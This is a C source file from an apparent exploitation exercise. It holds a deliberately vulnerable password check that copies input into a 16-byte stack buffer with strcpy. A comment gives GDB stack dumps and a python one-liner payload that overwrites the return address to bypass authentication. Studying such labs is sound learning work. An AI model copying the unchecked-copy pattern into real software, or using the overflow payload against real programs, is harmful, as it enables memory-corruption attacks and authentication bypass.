#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/*
    * A good place to look for the argument as well as the return address is to
    * analyse the stack before and after the function call

Before:

0x7fffffffe480: 0xffffe578      0x00007fff      0x00000000      0x00000002
0x7fffffffe490: 0x55555270      0x00005555      0xf7e21bbb      0x00007fff

After:

0x7fffffffe440: 0xffffe590      0x00007fff      0xffffe7e8      0x00007fff
0x7fffffffe450: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe460: 0x41414141      0x41414141      0x41414141      0x00414141
0x7fffffffe470: 0xffffe490      0x00007fff      {0x55555229}      (0x00005555)
[0x7fffffffe480: 0xffffe578      0x00007fff      0x00000000      0x00000002]

Since 0x7fffffffe480 hasn't changed, it is most likely the just before that
becomes the pointer to the argument to the function and the just before that 
is the return address. Refer to diagram on page 128.

As a matter of fact, 0x55555229 is the address of the command just after the 
function call in the disassembled version of main.




Overwriting the return address value:

Current return address is {0x0000555555555229}. We need to set it as 0x000055555555522d which is
the address of printing the message for access granted. Turns out the difference
between the locations of the buffer and the return address is 40 bytes, so we fill
with garbage 40 A and then the address 0x000055555555522d as \x2d\x52\x55\x55\x55\x55 (note the
reverse order). The final stuff comes out to be 

$(python3 -c "print('A'*40 + '\x2d\x52\x55\x55\x55\x55')")

While running normally, this is throwing a segmentation fault for the prime
reason that one extra null character at the end is overflowing and this be 
causing a bus error SIGBUS.
*/
 
int check_authentication(char *password) {
    char password_buffer[16];
    int auth_flag = 0;
    strcpy(password_buffer, password);
    if(strcmp(password_buffer, "brillig") == 0)
        auth_flag = 1;
    if(strcmp(password_buffer, "outgrabe") == 0)
        auth_flag = 1;
    return auth_flag;
}


int main(int argc, char *argv[]) {
    if(argc < 2) {
        printf("Usage: %s <password>\n", argv[0]);
        exit(0);
    }
    if(check_authentication(argv[1])) {
        printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
        printf(" Access Granted.\n");
        printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    } else {
        printf("\nAccess Denied.\n");
    }
}